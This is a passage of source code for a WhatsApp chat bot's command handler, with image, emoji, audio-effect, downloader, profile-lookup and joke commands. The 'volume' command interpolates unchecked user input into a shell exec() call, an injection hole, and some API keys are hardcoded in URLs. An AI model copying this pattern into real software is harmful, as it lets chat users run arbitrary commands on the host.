            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animelick':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animekill':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animecry':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewlp':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animekiss':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehug':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break

case 'couplepp': case 'ppcouple': {
reply(mess.wait)
let anucpp = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/couple.json')
let random = anucpp[Math.floor(Math.random() * anucpp.length)]
RyuuBotz.sendMessage(m.chat, { image: { url: random.male }, caption: `sukses kak couple male` }, { quoted: m })
RyuuBotz.sendMessage(m.chat, { image: { url: random.female }, caption: `sukses kak couple female` }, { quoted: m })
            }
	    break

case 'animeneko':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animepat':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeslap':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animecuddle':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewaifu':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animenom':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animefoxgirl':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animetickle': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            await RyuuBotz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animegecg': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            await RyuuBotz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'dogwoof': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            await RyuuBotz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case '8ballpool': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            await RyuuBotz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'goosebird': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            await RyuuBotz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animefeed': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            await RyuuBotz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeavatar': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            await RyuuBotz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'lizardpic': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            await RyuuBotz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'catmeow': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            await RyuuBotz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
    case 'igemoji': 
case 'instagramemoji': 
if (!q) return replyReinzID("Enter emoji, maximum 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "11")
break
case 'iphoneemoji': 
if (!q) return replyReinzID("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "0")
break
case 'googleemoji': 
if (!q) return replyReinzID("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "1")
break
case 'samsungemoji': 
if (!q) return replyReinzID("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "2")
break
case 'microsoftemoji': 
if (!q) return replyReinzID("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "3")
break
case 'whatsappemoji': 
if (!q) return replyReinzID("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "4")
break
case 'twitteremoji': 
if (!q) return replyReinzID("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "5")
break
case 'facebookemoji': 
case 'fbemoji': 
if (!q) return replyReinzID("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "6")
break
case 'skypeemoji': 
if (!q) return replyReinzID("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "7")
break
case 'joyemoji': 
if (!q) return replyReinzID("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "8")
break
case 'mojiemoji': 
if (!q) return replyReinzID("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "9")
case 'pediaemoji': 
if (!q) return replyReinzID("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "10")
break
case 'emoji': {
if (!args.join(" ")) return replyReinzID('Where is the emoji?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await RyuuBotz.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Made by ${global.botname}`}, {quoted:m})
await RyuuBotz.sendMessage(from, {text:"reply #s to this image to make sticker"}, {quoted:mese})
})
}
break
case 'volume': {
if (!args.join(" ")) return replyReinzID(`Contoh: ${prefix + command} 10`)
media = await RyuuBotz.downloadAndSaveMediaMessage(quoted, "volume")
if (isQuotedAudio) {
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replyReinzID('Error!')
jadie = fs.readFileSync(rname)
RyuuBotz.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
} else if (isQuotedVideo) {
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replyReinzID('Error!')
jadie = fs.readFileSync(rname)
RyuuBotz.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
} else {
replyReinzID("Send video/audio")
}
}
break
 case 'tinyurl':{
   if(!q) return replyReinzID('link?')
   const request = require('request')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
   try {
  replyReinzID(body)
  } catch (e) {
  replyReinzID(e)
  }
  })
  }
 break
case 'git': case 'gitclone': {
if (!args[0]) return replyReinzID(`Where is the link?\nContoh :\n${prefix}${command} https://github.com/DGXeon/XeonMedia`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replyReinzID(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    RyuuBotz.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replyReinzID(mess.error))
}
break
case 'spotify0': case 'spotifysearch0': case 'spotifys0': {
    if (!text) return reply('Masukan judul lagu!');
    let result = await searchSpotify(text);
    if (!result || result.length === 0) return reply('Lagu tidak ditemukan.');
    let caption = `🎵 *Hasil Pencarian Spotify*\n📌 _Keyword_: *${text}*\n\n`;
    caption += result.map((v, i) => {
        return `*${i + 1}. ${v.name}*\n   🎤 *Artist*: ${v.artist || 'Unknown'}\n   🔗 *Link*: ${v.link}`;
    }).join('\n\n');
    caption += `\n\n✨ *Pilih dan salin link terus  ketik spdl untuk mendownload audionya*`;
    reply(caption);
}
break;

case 'spdl0': case 'spotifydl0': {
if (!text) return reply('Masukan Link')
let result = await spotifydl(text)
let captionvid = `∘ Title: ${result.title}\n∘ Artist: ${result.artis}\n∘ Type: ${result.type}\n\nReinzID Chx`
 const p = await new canvafy.Spotify()
            .setTitle(result.title)
            .setAuthor("Spotify - Downloader")
            .setTimestamp(40, 100)
            .setOverlayOpacity(0.8)
            .setBorder("#fff", 0.8)
            .setImage(result.image)
            .setBlur(3)
            .build(); 

       await RyuuBotz.sendMessage(from, { image: p, caption: captionvid }, { quoted: m })
    RyuuBotz.sendMessage(m.chat, { audio: { url: result.download}, mimetype: 'audio/mpeg', filename: 'MP3 BY ' + 'ReinzID Chx' }, { quoted: m });
}
break
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
    try {
        let set;
        if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20';
        else if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log';
        else if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3';
        else if (/earrape/.test(command)) set = '-af volume=12';
        else if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"';
        else if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"';
        else if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25';
        else if (/reverse/.test(command)) set = '-filter_complex "areverse"';
        else if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"';
        else if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"';
        else if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"';
        else if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"';
        if (set) {
            if (/audio/.test(mime)) {
                await reply(mess.wait);
                let media = await RyuuBotz.downloadAndSaveMediaMessage(quoted);
                let ran = getRandom('.mp3');
                console.log(`Running ffmpeg command: ffmpeg -i ${media} ${set} ${ran}`);
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                    fs.unlinkSync(media);
                    if (err) {
                        console.error(`ffmpeg error: ${err}`);
                        return replyReinzID(err);
                    }
                    
                    let buff = fs.readFileSync(ran);
                    RyuuBotz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: m });
                    fs.unlinkSync(ran);
                });
            } else {
                replyReinzID(`Reply to the audio you want to change with a caption *${prefix + command}*`);
            }
        } else {
            replyReinzID('Invalid command');
        }
    } catch (e) {
        replyReinzID(e);
    }
    break
case 'define': 
if (!q) return replyReinzID(`What do you want to define?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return replyReinzID(mess.error)
let reply =`
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
   RyuuBotz.sendMessage(m.chat,{text:reply},{quoted:m})
} catch (err) {
    console.log(err)
    return replyReinzID(`*${q}* isn't a valid text`)
    }
    break
case 'chhgan': {
            	if (!text) return replyReinzID(`Ask question\n\nContoh : ${prefix + command} i dance?`)
            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
let keh = bisa[Math.floor(Math.random() * bisa.length)]
let jawab = `*Can ${text}*\nAnswer : ${keh}`
            await replyReinzID(jawab)
            }
            break
            case 'ighas': {
            	if (!text) return replyReinzID(`Ask question\n\nContoh : ${prefix + command} she virgin?`)
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
let kah = apa[Math.floor(Math.random() * apa.length)]
let jawab = `*Is ${text}*\nAnswer : ${kah}`
            await replyReinzID(jawab)
            }
            break
            case 'wheggdfen': {
            	if (!text) return replyReinzID(`Ask question\n\nContoh : ${prefix + command} will i get married?`)
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
let koh = kapan[Math.floor(Math.random() * kapan.length)]
let jawab = `*${command} ${text}*\nAnswer : ${koh}`
            await replyReinzID(jawab)
            }
            break
case 'whadfffdt': {
            	if (!text) return replyReinzID(`Ask question\n\nContoh : ${prefix + command} is your name?`)
            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
let kah = lel[Math.floor(Math.random() * lel.length)]
let jawab = `*What ${text}*\nAnswer : ${kah}`
            await replyReinzID(jawab)
            }
            break
case 'wheddfrfre': {
if (!text) return replyReinzID(`Ask question\n\nContoh : ${prefix + command} is your name?`)
            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
let jawab = `*Whwre ${text}*\nAnswer : ${kah}`              
            await replyReinzID(jawab)
            }
            break
case 'hohyyw': {
            	if (!text) return replyReinzID(`Ask question\n\nContoh : ${prefix + command} to date girl?`)
            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
let kah = gimana[Math.floor(Math.random() * gimana.length)]
let jawab = `*How ${text}*\nAnswer : ${kah}`
            await replyReinzID(jawab)
            }
            break
case 'raddrdte': {
            	if (!text) return replyReinzID(`Contoh : ${prefix + command} my profile`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
let kah = ra[Math.floor(Math.random() * ra.length)]
let jawab = `*Rate ${text}*\nAnswer : ${kah}%`
            await replyReinzID(jawab)
            }
            break
            case 'runtime': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
replyReinzID(lowq)
            	}
            break
            case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
RyuuBotz.sendMessage(m.chat, { text: xeonkak }, { quoted: m })
break
           case 'jodoh':
            case 'jodohku': {
            if (!m.isGroup) return reply(mess.only.group)
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
RyuuBotz.sendMessage(m.chat,
{ text: `👫Your Soulmate Is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnailUrl": 'https://telegra.ph/file/49f2b139a2aff4bb934f7.jpg',
"sourceUrl": `${linkSaluran}`}}},
{ quoted: m})        
            }
            break
 case 'couple': {
            if (!m.isGroup) return reply(mess.only.group)
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
RyuuBotz.sendMessage(m.chat,
{ text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
Cieeee, What's Going On❤️💖👀`,
contextInfo:{
mentionedJid:[orang, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
thumbnailUrl: global.thumbnail,
"sourceUrl": `${linkSaluran}`}}},
{ quoted: m})        
            }
            break;
            case 'ustad': 
            case 'uztad': 
            case 'uztadz': {
  if (!text) return reply(`Contoh:\n${prefix + command} Makan Sambil Kuyang Bisa Gak Pak Ustad`)
  
  await RyuuBotz.sendMessage(m.chat, {caption: mess.success, image: { url: 'https://api.taka.my.id/tanya-ustad?quest=' + encodeURIComponent(text) }
  }, { quoted: m })
  break
}
    case 'coffee': case 'kopi': {
RyuuBotz.sendMessage(m.chat, {caption: mess.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
            }
            break
            case 'wallpaper': {
if (!text) return replyReinzID('Enter Query Title')
reply(mess.wait)
		let { wallpaper } = require('./lib/scraper')
anuwallpep = await wallpaper(text)
result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]
RyuuBotz.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
            }
            break
            case 'wikimedia': {
if (!text) return replyReinzID('Enter Query Title')
reply(mess.wait)
		let { wikimedia } = require('./lib/scraper')
let anumedia = await wikimedia(text)
result = anumedia[Math.floor(Math.random() * anumedia.length)]
RyuuBotz.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: m })
            }
            break
            case 'pick': {
            	if (!m.isGroup) return reply(mess.only.group)
            	if (!text) return replyReinzID(`What do you want to pick?\nContoh: ${prefix + command} idiot`)
             const groupMetadata = m.isGroup ? await RyuuBotz.groupMetadata(m.chat)
 .catch((e) => {}) : ""
             const participants = m.isGroup ? await groupMetadata.participants : ""
             let member = participants.map((u) => u.id)
             let me = m.sender
             let xeonshimts = member[Math.floor(Math.random() * member.length)]
             RyuuBotz.sendMessage(from, { 
text: `The most *${text}* here is *@${xeonshimts.split("@")[0]}*`,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[xeonshimts],
"externalAdReply": {
"showAdAttribution": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"containsAutoReply": true,
"previewType": "PHOTO",
"thumbnailUrl": ``,
thumbnailUrl: global.thumbnail,
"sourceUrl": `${linkSaluran}`
}
}
}, { quoted: m })
         }
     break
case 'instagramstalk2':
case 'igstalk2': {
if (!text) return replyReinzID(`Enter Instagram Username\n\nContoh: ${prefix + command} ReinzID`)
RyuuBotz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
    try {
const dat = await fetchJson(`https://btch.us.kg/download/igstalkfull?username=${encodeURIComponent(text)}`);
if (!dat || !dat.result) {
    return RyuuBotz.sendMessage(m.chat, { text: "Data tidak ditemukan atau API error." }, { quoted: m });
}
const data = dat.result;
const data1 = dat.result.stats;
const te = `
┌──「 *STALKING* 」
▢ *🔖Name:* ${data.fullName} 
▢ *🔖Username:* ${data.username.replace(/^@/, '')}
▢ *👥Follower:* ${data1.followers}
▢ *🫂Following:* ${data1.following}
▢ *📌Bio:* ${data.bio}
▢ *🏝️Posts:* ${data1.posts}
▢ *🔗 Link:* https://instagram.com/${data.username.replace(/^@/, '')}
└────────────`;
await RyuuBotz.sendMessage(m.chat, { image: { url: data.profilePic }, caption: te }, { quoted: m });
      } catch {
        replyReinzID(`Pastikan nama pengguna berasal dari *Instagram*`)
      }
}
break
case 'tiktokstalk':
case 'ttstalk': {
    if (!text) return replyReinzID(`Masukkan TikTok Username\n\nContoh: ${prefix + command} ReinzID`);
    RyuuBotz.sendMessage(m.chat, { react: { text: '🕒', key: m.key } });
    
    try {
        const respon = await fetchJson(`https://api.elxyzgpt.xyz/stalk/tiktok?apikey=KC-d25a3f0c02be4021&username=${encodeURIComponent(text)}`);
        const user = respon.result.user;
        const stats = respon.result.stats;
        let teks = `
┌──「 *STALKING* 」
▢ *🔖 Name:* ${user.nickname}
▢ *🔖 Username:* ${user.uniqueId}
▢ *👥 Followers:* ${stats.followerCount}
▢ *🫂 Following:* ${stats.followingCount}
▢ *📌 Bio:* ${user.signature}
▢ *🏝️ Posts:* ${stats.videoCount}
▢ *❣️ Likes:* ${stats.heartCount}
▢ *🔗 Link:* https://tiktok.com/@${user.uniqueId}
└────────────`;

        await RyuuBotz.sendMessage(
            m.chat, 
            { image: { url: user.avatarLarger }, caption: teks }, 
            { quoted: m }
        );
    } catch (err) {
        console.error(err);
        replyReinzID(`Terjadi kesalahan. Pastikan username berasal dari TikTok.`);
    }
}
break;
case 'fbdl':
case 'fbdownload':
case 'facebook': 
case 'fb': {
  if (!text) return replyryuu(`Contoh: ${prefix + command} https://facebook.com/reel/123`);

  try {
    let res = await fetch(`https://www.apiaccess.web.id/download/facebook?apikey=ryuu&url=${encodeURIComponent(text)}`);
    let json = await res.json();

    if (!json.status || !json.result) return replyryuu("Gagal mengambil video. Pastikan URL valid!");

    let result = json.result;
    let video720 = result.video.find(v => v.quality.includes("720"));
    if (!video720) return replyryuu("Maaf, resolusi 720p tidak tersedia.");

    await RyuuBotz.sendMessage(m.chat, {
      video: { url: video720.url },
      caption: `📹 *${result.title || "Video Facebook"}*\n⏱️ Durasi: ${result.duration}\n🎞️ Kualitas: 720p\n\n📤 Powered by @Ryuu`,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
        externalAdReply: {
          title: "Download Video Facebook",
          body: "Kualitas 720p Tersedia 🎞️",
          mediaUrl: video720.url,
          sourceUrl: text,
          thumbnail: await getBuffer(result.thumbnail),
          mediaType: 2,
          renderLargerThumbnail: true,
          showAdAttribution: true
        }
      }
    }, { quoted: m });
    
  } catch (e) {
    console.error(e);
    replyryuu("Terjadi kesalahan saat memproses permintaan.");
  }
}
break;
//=========================================\\
    case 'tts': {
  if (!text) return reply(`Contoh: ${prefix + command} Halo, apa kabar?`)

  // Kirim notifikasi loading
  await RyuuBotz.sendMessage(m.chat, { react: { text: "🌀", key: m.key } })

  try {
    // Fetch ke endpoint TTS
    const res = await fetch(`https://www.apiaccess.web.id/tools/text-to-speech?apikey=ryuu&text=${encodeURIComponent(text)}`)
    const json = await res.json()
    if (!json.status) return reply('Gagal mengambil data TTS.')

    const audioList = json.result

    // Mapping ke dalam rows button
    const rows = audioList.map(item => {
      const name = item.voice_name
      const audioUrl = Object.values(item).find(v => typeof v === 'string' && v.includes('https://'))
      return {
        title: `🔊 ${name}`,
        description: `Klik untuk dengarkan suara "${name}"`,
        rowId: `${prefix}playtts ${audioUrl}`
      }
    })

    const sections = [{
      title: "🗣️ Pilih Suara TTS",
      rows: rows
    }]

    const listMessage = {
      text: `🎤 *Teks:* ${text}`,
      footer: "Pilih salah satu suara TTS dari daftar di bawah ini.",
      buttonText: "🎙️ Pilih Karakter",
      sections: sections
    }

    await RyuuBotz.sendMessage(m.chat, listMessage, { quoted: m })

  } catch (e) {
    console.error(e)
    reply('❌ Terjadi kesalahan saat memproses TTS.')
  }
}
break;
case 'playtts': {
  if (!text || !text.includes('https://')) return reply("URL audio tidak valid.")

  try {
    await RyuuBotz.sendMessage(m.chat, {
      audio: { url: text },
      mimetype: 'audio/mpeg',
      ptt: false
    }, { quoted: m })
  } catch (e) {
    console.error(e)
    reply('❌ Gagal mengirim audio.')
  }
}
break
    case 'fact': {
    	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
        return replyReinzID(`${themeemoji} *Fact:* ${data.fact}\n`)   
    }
    break
    
case 'aimage': {
try {
  if (!isPrem) return replyprem(mess.premium)
if (global.keyopenai === '') return replyReinzID("Apike Anda Limit");
if (!q) return replyReinzID(`Generate image from AI.\n\nContoh:\n${prefix + command} Cowok Naik Kuda`)
const { Configuration, OpenAIApi } = require('openai')
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createImage({
prompt: text,
n: 1,
size: "512x512",
});
//console.log(response.data.data[0].url)
RyuuBotz.sendImage(from, response.data.data[0].url, text, m);
} catch (err) {
console.log(err);
replyReinzID("Sorry, there seems to be an error :"+ err);
}
}
break

case 'nomerhoki': case 'nomorhoki': {
if (!Number(text)) return reply(`Contoh : ${prefix + command} 62xxxxxxxx`)
let anu = await primbon.nomer_hoki(Number(text))
if (anu.status == false) return reply(anu.message)
reply(`• *Nomor HP :* ${anu.message.nomer_hp}\n• *Angka Shuzi :* ${anu.message.angka_shuzi}\n• *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n• *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`)
}
break
case 'artimimpi': case 'tafsirmimpi': {
if (!text) return reply(`Contoh : ${prefix + command} belanja`)
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return reply(anu.message)
